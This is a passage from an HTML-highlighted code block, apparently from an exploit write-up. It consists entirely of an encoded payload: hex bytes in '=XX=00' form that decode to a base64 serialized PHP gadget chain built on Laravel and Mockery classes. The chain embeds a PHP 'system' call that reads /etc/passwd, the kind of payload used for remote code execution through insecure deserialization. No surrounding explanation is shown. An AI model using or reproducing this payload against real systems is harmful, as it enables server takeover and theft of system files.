class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">72</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">72</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">71</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">66</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">53</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">65</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">2</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">66</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">2</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">53</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span 